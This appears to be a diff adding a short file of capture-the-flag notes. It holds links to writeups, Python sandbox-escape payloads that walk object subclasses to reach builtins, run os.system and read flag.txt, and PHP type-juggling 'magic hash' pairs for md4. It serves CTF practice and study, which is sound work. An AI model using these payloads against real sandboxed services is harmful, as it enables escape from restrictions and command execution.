@@ -1,0 +1,38 @@
+writeups.txt
+
+- https://sectt.github.io/writeups/FBCTF19/secret_note_keeper/README
+
+- keith bot
+
+
+python2.7
+().__class__.__bases__[0].__subclasses__()[40]('flag.txt').read()
+
+
+python3
+
+[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == "catch_warnings"][0]()._module.__builtins__['__import__']('os').system('ls')
+
+
+[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == "catch_warnings"][0]()._module.__builtins__['print'](
+[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == "catch_warnings"][0]()._module.__builtins__['open']('flag.txt').read())
+
+[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == "catch_warnings"][0]()._module.__builtins__['print'](
+[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == "catch_warnings"][0]()._module.__builtins__['open']('flag.txt').read())
+
+
+
+https://blog.osiris.cyber.nyu.edu/ctf/exploitation%20techniques/2012/10/26/escaping-python-sandboxes/
+https://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape/
+
+
+- md4
+
+PHP type juggling:
+
+$ ./md4
+0e251288019 0e874956163641961271069404332409
+0e898201062 0e554290472281246806387669628377
+
+
+- A simple conversation - input.py
